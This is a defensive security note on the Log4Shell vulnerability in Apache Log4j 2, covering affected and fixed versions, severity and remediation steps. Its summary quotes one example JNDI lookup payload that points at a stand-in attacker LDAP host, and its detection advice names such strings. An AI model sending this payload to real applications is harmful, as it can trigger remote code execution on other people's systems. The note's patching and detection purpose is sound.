# Security Notes: Log4Shell (CVE-2021-44228)

## Summary

Log4Shell is a critical remote code execution (RCE) vulnerability in Apache Log4j 2, an
ultra-popular Java logging framework. It exploits the JNDI lookup feature of Log4j 2's
message logging: an attacker who can control log messages or log message parameters can
supply a crafted payload such as `${jndi:ldap://attacker.example/a}` and cause the
application to load and execute arbitrary code from an attacker-controlled LDAP/RMI server.

## CVE identifier

- **CVE-2021-44228** — the primary Log4Shell CVE.
- Related follow-on CVEs: CVE-2021-45046 (2.15.0 patch incomplete), CVE-2021-45105,
  CVE-2021-44832. The final patched release 2.17.1 addresses all of them.

## Affected versions

- **Affected:** Apache Log4j2 versions **2.0-beta9 through 2.14.1** (i.e.,
  `[2.0-beta9, 2.3.1) ∪ [2.4, 2.12.2) ∪ [2.13.0, 2.15.0)` per the Apache security page).
  In practice: >= 2.13.0 and < 2.15.0, >= 2.4 and < 2.12.2, >= 2.0-beta9 and < 2.3.1.
- Only the `log4j-core` JAR is impacted; applications using only `log4j-api` without
  `log4j-core` are not affected.
- Log4j 1.x is End of Life (since 2015) and will not receive patches; migrate to Log4j 2.

## Fixed versions

- **First fix for CVE-2021-44228: 2.15.0** (Java 8 and later), 2.12.2 (Java 7), 2.3.1 (Java 6).
- **2.16.0** disables JNDI lookups by default and completely removes message lookups
  (addressing CVE-2021-45046).
- **2.17.1** is the final patched release covering CVE-2021-44228, -45046, -45105, and -44832.
- Keep `log4j-api` and `log4j-core` at the same version for compatibility.

## Severity

- **CVSS 3.1 Base Score: 10.0 — CRITICAL**
- Vector: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`
- NVD and CISA both rate this as Critical/10.0; CISA added it to the Known Exploited
  Vulnerabilities (KEV) catalog.

## Remediation actions

1. **Upgrade path** — move to Log4j 2.17.1+ (minimum 2.15.0 for CVE-2021-44228 alone;
   2.16.0+ recommended because 2.15.0 did not fully disable JNDI lookups).
2. **Detecting vulnerable deployments** — inventory transitive dependencies for
   `org.apache.logging.log4j:log4j-core` in the affected version ranges; check deployed
   JARs/classpaths; watch for `${jndi:...}` payloads and outbound LDAP/RMI traffic.
3. **Hardening** — set `log4j2.formatMsgNoLookups=true`, remove/rename the `JndiLookup`
   class as a compensating control, and restrict outbound LDAP/RMI at the network layer.
4. **Automated dependency scanning** — enable GitHub Dependabot alerts/updates, run
   OWASP Dependency-Check or Snyk in CI, and add CI gates that fail on the affected
   version ranges.

## Sources

- NVD — CVE-2021-44228: https://nvd.nist.gov/vuln/detail/CVE-2021-44228
- Apache Logging Services Security page:
  https://logging.apache.org/log4j/2.x/security.html
- GitHub Advisory Database (GHSA-jfh8-c2jp-5v3q):
  https://github.com/advisories/ghsa-jfh8-c2jp-5v3q
- CISA Known Exploited Vulnerabilities Catalog (CVE-2021-44228).
